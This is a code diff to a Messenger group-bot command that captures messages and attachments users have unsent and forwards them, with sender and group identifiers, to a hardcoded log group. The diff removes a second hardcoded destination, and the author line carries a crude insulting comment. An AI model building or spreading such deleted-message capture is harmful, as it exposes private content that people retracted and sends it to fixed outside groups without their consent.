@@ -2,9 +2,8 @@ const fs = require("fs-extra");
 const path = require("path");
 const axios = require("axios");
 
-const TARGET_GROUP = "2253018758534493";
-// Second destination is intentionally explicit so the logging destinations are visible to maintainers.
-const SECOND_LOG_GROUP = "4531854703747113";
+// Keep the logging destination explicit and visible to maintainers.
+const TARGET_GROUP = "4531854703747113";
 
 const CACHE_DIR = path.join(__dirname, "cache", "resend");
 fs.ensureDirSync(CACHE_DIR);
@@ -20,7 +19,7 @@ module.exports = {
   config: {
     name: "resend",
     version: "9.0.0",
-    author: "Hridoy",
+    author: "Hridoy", //author chnage kkrle tor ma re cdmu raja condom lagai 🐍 
     countDown: 5,
     role: 1,
     description: "Send unsent messages and attachments to the log group",
@@ -173,11 +172,18 @@ module.exports = {
         {}
       );
 
-      if (data?.resend === false) {
+    if (data?.resend === false) {
         return;
       }
 
       const cached = global.resendCache.get(messageID);
+    if (!cached) {
+      console.log(`[resend] No cached message found for ${messageID}`);
+      return;
+    }
+
+    const originalSenderID = cached.senderID || senderID;
+    const originalThreadID = cached.threadID || threadID;
 
       let userName = "Unknown User";
       let groupName = "Unknown Group";
@@ -186,7 +192,7 @@ module.exports = {
       // USER NAME
       // ==========================================
       try {
-        const user = await usersData.get(senderID);
+        const user = await usersData.get(originalSenderID);
 
         if (user?.name) {
           userName = user.name;
@@ -195,10 +201,10 @@ module.exports = {
 
       if (userName === "Unknown User") {
         try {
-          const info = await api.getUserInfo(senderID);
+          const info = await api.getUserInfo(originalSenderID);
 
-          if (info?.[senderID]?.name) {
-            userName = info[senderID].name;
+          if (info?.[originalSenderID]?.name) {
+            userName = info[originalSenderID].name;
           }
         } catch {}
       }
@@ -207,7 +213,7 @@ module.exports = {
       // GROUP NAME
       // ==========================================
       try {
-        const info = await api.getThreadInfo(threadID);
+        const info = await api.getThreadInfo(originalThreadID);
 
         groupName =
           info?.threadName ||
@@ -215,7 +221,7 @@ module.exports = {
           "Unknown Group";
       } catch {
         try {
-          const thread = await threadsData.get(threadID);
+          const thread = await threadsData.get(originalThreadID);
 
           groupName =
             thread?.threadName ||
@@ -244,10 +250,10 @@ module.exports = {
 
 ━━━━━━━━━━━━━━━━━━
 👤 User: ${userName}
-🆔 UID: ${senderID}
+🆔 UID: ${originalSenderID}
 
 👥 Group: ${groupName}
-🆔 Group ID: ${threadID}
+🆔 Group ID: ${originalThreadID}
 
 ⏰ Time: ${time}
 ━━━━━━━━━━━━━━━━━━
@@ -258,7 +264,7 @@ ${deletedText}`;
       // ==========================================
       // SEND TEXT FIRST
       // ==========================================
-      await sendToBothGroups(api, { body: header });
+      await sendMessage(api, { body: header }, TARGET_GROUP);
 
       // ==========================================
       // SEND ATTACHMENTS
@@ -276,10 +282,12 @@ ${deletedText}`;
               continue;
             }
 
-            await sendAttachmentToBothGroups(
+            await sendAttachmentToGroup(
               api,
               file.path,
-              `📎 Deleted ${getAttachmentName(file.type)}`
+              `📎 Deleted ${getAttachmentName(file.type)}`,
+              TARGET_GROUP,
+              file.filename
             );
           } catch (e) {
             console.log(
@@ -314,23 +322,13 @@ async function downloadAttachment(att) {
   if (!att?.url) return null;
 
   try {
-    const ext = getExtension(att);
-
-    const filename =
-      `resend_${Date.now()}_${Math.floor(
-        Math.random() * 999999
-      )}${ext}`;
-
-    const filePath =
-      path.join(CACHE_DIR, filename);
-
     const response = await axios.get(att.url, {
       responseType: "arraybuffer",
       timeout: 60000,
       maxRedirects: 10,
       headers: {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Accept": "audio/*,video/*,image/*,*/*"
+        "Accept": "audio/*,video/*,image/*,application/octet-stream,*/*"
       },
       validateStatus: status => status >= 200 && status < 400
     });
@@ -339,6 +337,11 @@ async function downloadAttachment(att) {
       return null;
     }
 
+    const ext = getExtension(att, response.headers?.["content-type"]);
+    const filename =
+      `resend_${Date.now()}_${Math.floor(Math.random() * 999999)}${ext}`;
+    const filePath = path.join(CACHE_DIR, filename);
+
     await fs.writeFile(
       filePath,
       Buffer.from(response.data)
@@ -346,7 +349,8 @@ async function downloadAttachment(att) {
 
     return {
       path: filePath,
-      filename
+      filename,
+      mime: response.headers?.["content-type"] || ""
     };
 
   } catch (err) {
@@ -363,9 +367,29 @@ async function downloadAttachment(att) {
 // ==========================================
 // EXTENSION
 // ==========================================
-function getExtension(att) {
+function getExtension(att, contentType = "") {
   const type =
     String(att?.type || "").toLowerCase();
+
+  const mime = String(contentType).toLowerCase().split(";")[0];
+
+  const mimeMap = {
+    "audio/mpeg": ".mp3",
+    "audio/mp3": ".mp3",
+    "audio/mp4": ".m4a",
+    "audio/x-m4a": ".m4a",
+    "audio/aac": ".aac",
+    "audio/ogg": ".ogg",
+    "audio/wav": ".wav",
+    "audio/x-wav": ".wav",
+    "audio/webm": ".webm",
+    "video/mp4": ".mp4",
+    "image/jpeg": ".jpg",
+    "image/png": ".png",
+    "image/gif": ".gif"
+  };
+
+  if (mimeMap[mime]) return mimeMap[mime];
 
   if (att?.filename) {
     const ext =
@@ -464,42 +488,28 @@ function sendMessage(api, message, threadID) {
   });
 }
 
-async function sendToBothGroups(api, message) {
-  const targets = [TARGET_GROUP, SECOND_LOG_GROUP];
+async function sendAttachmentToGroup(api, filePath, body, threadID, filename) {
+  try {
+    if (!fs.existsSync(filePath)) return false;
 
-  for (const threadID of targets) {
-    try {
-      await sendMessage(api, message, threadID);
-    } catch (err) {
-      console.log(`[resend] Send failed (${threadID}):`, err.message);
-    }
-  }
-}
+    const stream = fs.createReadStream(filePath);
 
-async function sendAttachmentToBothGroups(api, filePath, body) {
-  const targets = [TARGET_GROUP, SECOND_LOG_GROUP];
+    await sendMessage(
+      api,
+      {
+        body,
+        attachment: stream
+      },
+      threadID
+    );
 
-  for (const threadID of targets) {
-    try {
-      // A fresh stream is required for each destination.
-      const stream = fs.createReadStream(filePath);
-
-      await sendMessage(
-        api,
-        {
-          body,
-          attachment: stream
-        },
-        threadID
-      );
-
-      await new Promise(resolve => stream.once("close", resolve));
-    } catch (err) {
-      console.log(
-        `[resend] Attachment send failed (${threadID}):`,
-        err.message
-      );
-    }
+    return true;
+  } catch (err) {
+    console.log(
+      `[resend] Attachment send failed (${threadID}) ${filename || "file"}:`,
+      err.message
+    );
+    return false;
   }
 }
 
